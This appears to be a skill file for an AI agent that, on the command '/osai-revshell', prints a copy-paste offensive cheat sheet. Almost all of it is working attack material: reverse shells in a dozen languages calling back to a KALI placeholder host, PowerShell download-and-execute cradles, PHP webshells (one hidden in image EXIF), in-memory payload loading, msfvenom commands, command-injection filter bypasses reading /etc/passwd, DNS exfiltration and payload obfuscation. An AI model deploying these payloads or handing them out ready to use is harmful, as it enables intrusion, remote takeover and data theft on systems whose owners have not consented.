# Trigger
User says `/osai-revshell` followed by an optional category.

Categories: bash, powershell, python, php, windows, upgrade, cmdinject, obfuscate

$ARGUMENTS = optional category filter. If empty, list all categories with one-line description and ask which one.

# Purpose
Reverse shells, shell upgrades, command injection filter bypasses, and obfuscation for engagement. Copy-paste ready.

# Steps

## If no category specified, print this menu:
```
OSAI REVERSE SHELL & CMD INJECTION CHEAT SHEET
  bash       — Bash/sh reverse shells (/dev/tcp, nc, mkfifo, socat)
  powershell — PowerShell reverse shells (one-liners, encoded, download-cradles)
  python     — Python reverse & bind shells
  php        — PHP webshells and reverse shells
  windows    — Windows-native reverse shells (C#, msbuild, workflow compiler)
  upgrade    — Shell upgrade / TTY stabilization
  cmdinject  — Command injection filter bypass (no space, no slash, quotes, encoding)
  obfuscate  — Payload obfuscation (base64, hex, variable expansion, wildcards)

Usage: /osai-revshell bash
```

---

## Category: bash

### /dev/tcp
```bash
bash -i >& /dev/tcp/KALI/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/KALI/PORT 0>&1'
0<&196;exec 196<>/dev/tcp/KALI/PORT; sh <&196 >&196 2>&196
```

### Netcat (traditional)
```bash
nc -e /bin/sh KALI PORT
nc -e /bin/bash KALI PORT
nc -c bash KALI PORT
```

### Netcat (no -e / OpenBSD)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI PORT >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc KALI PORT >/tmp/f
```

### Ncat (SSL)
```bash
ncat --ssl KALI PORT -e /bin/bash
```

### Socat
```bash
socat TCP4:KALI:PORT EXEC:/bin/bash
socat TCP4:KALI:PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

### Perl
```bash
perl -e 'use Socket;$i="KALI";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("KALI",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Node.js
```bash
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(PORT,"KALI",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'
```

### Java (Runtime)
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/KALI/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Lua
```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('KALI','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

---

## Category: powershell

### One-liner (TCPClient)
```powershell
$client = New-Object System.Net.Sockets.TCPClient('KALI',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Base64 encoded launcher
```powershell
# Generate on Kali:
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://KALI/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
# Execute on target:
powershell -enc <BASE64_STRING>
powershell -e <BASE64_STRING>
```

### Download cradles
```powershell
# IEX download
IEX (New-Object Net.WebClient).DownloadString('http://KALI/rev.ps1')
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://KALI/rev.ps1')"

# Invoke-WebRequest
IEX (Invoke-WebRequest -Uri 'http://KALI/rev.ps1' -UseBasicParsing).Content

# With proxy credentials
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://KALI/rev.ps1')|iex"

# From WebDAV
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

### Powercat
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://KALI/powercat.ps1')
powercat -c KALI -p PORT -e cmd.exe
powercat -c KALI -p PORT -e cmd.exe -g > revshell.ps1  # generate payload
powercat -c KALI -p PORT -e cmd.exe -ge > revshell_enc.ps1  # encoded
```

### ConPtyShell (interactive PTY over PS)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-ConPtyShell.ps1')
Invoke-ConPtyShell -RemoteIp KALI -RemotePort PORT -Rows 24 -Cols 80
```

---

## Category: python

### Python 3 reverse shell
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Python 2 reverse shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python bind shell
```python
python3 -c 'import socket,os,pty;s=socket.socket();s.bind(("0.0.0.0",PORT));s.listen(1);(c,a)=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("/bin/bash")'
```

### Python PTY import
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Category: php

### PHP reverse shell (exec)
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/KALI/PORT 0>&1'"); ?>
```

### PHP system one-liner
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

### PHP backtick webshell
```php
<?=`$_GET[0]`?>
```

### PHP webshell (POST)
```php
<?php if($_POST){system($_POST['cmd']);} ?>
```

### Alternative tags (no <?php)
```html
<script language="php">system("id");</script>
```

### PHP in image EXIF
```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

---

## Category: windows

### C# reverse shell compile
```cmd
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

### Load assembly in memory (no file on disk)
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://KALI/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Namespace.Class]::Main("args here".Split())
```

### Execute method from DLL in memory
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://KALI/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

### Cross-compile C++ with mingw
```bash
i686-w64-mingw32-g++ shell.cpp -o shell.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### msfvenom quick ref
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=PORT -f exe > shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=PORT -f exe > shell64.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI LPORT=PORT -f exe > met.exe
msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=PORT -f dll > shell.dll
msfvenom -p linux/x86/shell_reverse_tcp LHOST=KALI LPORT=PORT -f elf > shell.elf
```

---

## Category: upgrade

### Python PTY spawn
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Full TTY upgrade (after PTY spawn)
```bash
# In reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z (background shell)
# On attacker:
stty raw -echo; fg
# Back in reverse shell:
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 120
```

### Script method
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows 40 cols 120
```

### rlwrap (for Windows shells)
```bash
rlwrap nc -lvnp PORT
```

### Socat full TTY
```bash
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:PORT
# Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:KALI:PORT
```

---

## Category: cmdinject

### Command chaining operators
```
cmd1; cmd2          # sequential
cmd1 && cmd2        # cmd2 only if cmd1 succeeds
cmd1 || cmd2        # cmd2 only if cmd1 fails
cmd1 & cmd2         # background cmd1
cmd1 | cmd2         # pipe
```

### Command substitution
```bash
original_cmd `cat /etc/passwd`
original_cmd $(cat /etc/passwd)
```

### Bypass without space
```bash
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'uname\x20-a'&&$X
;ls%09-al%09/home                    # tab character 0x09
```

### Windows space bypass
```
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```

### Bypass with backslash newline
```bash
cat /et\
c/pa\
sswd
```

### Bypass no slash
```bash
echo ${HOME:0:1}                     # outputs: /
cat ${HOME:0:1}etc${HOME:0:1}passwd
echo . | tr '!-0' '"-1'             # outputs: /
```

### Bypass with quotes (break up commands)
```bash
w'h'o'am'i
w"h"o"am"i
wh``oami
who$@ami
who$()ami
w\ho\am\i
```

### Windows case/caret bypass
```
wHoAmi
w^h^o^a^m^i
```

### Windows wildcard bypass
```
powershell C:\*\*2\n??e*d.*?
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e
```

### Brace expansion
```bash
{,ip,a}
{,ifconfig}
{l,-lh}s
```

### Variable expansion (wildcard path)
```bash
/???/??t /???/p??s??
test=/ehhh/hmtc/pahhh/hmsswd; cat ${test//hhh\/hm/}
```

### Hex encoding
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
xxd -r -p <<< 2f6574632f706173737764
cat `xxd -r -p <<< 2f6574632f706173737764`
```

### Polyglot injection (works unquoted, single-quoted, double-quoted)
```
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

### Time-based data exfil
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### DNS-based data exfil
```bash
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

### Argument injection
```bash
curl http://ATTACKER/ -o webshell.php
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
psql -o'|id>/tmp/foo'
```

### WorstFit (Windows ANSI) — bypass escapeshellarg()
Use fullwidth double quotes U+FF02 instead of U+0022:
```
Payload: ＂ --use-askpass=calc ＂
```

---

## Category: obfuscate

### Base64 encode (Linux)
```bash
echo -n 'bash -i >& /dev/tcp/KALI/PORT 0>&1' | base64
echo <BASE64> | base64 -d | bash
```

### Base64 encode (PowerShell)
```powershell
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://KALI/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell -enc $enc
```

### Hex payload
```bash
echo -n 'id' | xxd -p
# Execute:
echo 6964 | xxd -r -p | bash
```

### ANSI-C quoting
```bash
$'cat\x20/etc/passwd'
```

### String concatenation (PowerShell)
```powershell
$a='IEX';$b='(New-Object Net.WebClient)';$c='.DownloadString';iex "$a $b$c('http://KALI/shell.ps1')"
```

### Environment variable substring (Windows cmd)
```cmd
set a=whoami
%a%
set b=who
set c=ami
%b%%c%
```

### Background long-running commands
```bash
nohup sleep 120 > /dev/null &
```

# Token discipline
Print ONLY the requested category. Never dump the entire cheat sheet unless user asks for all.
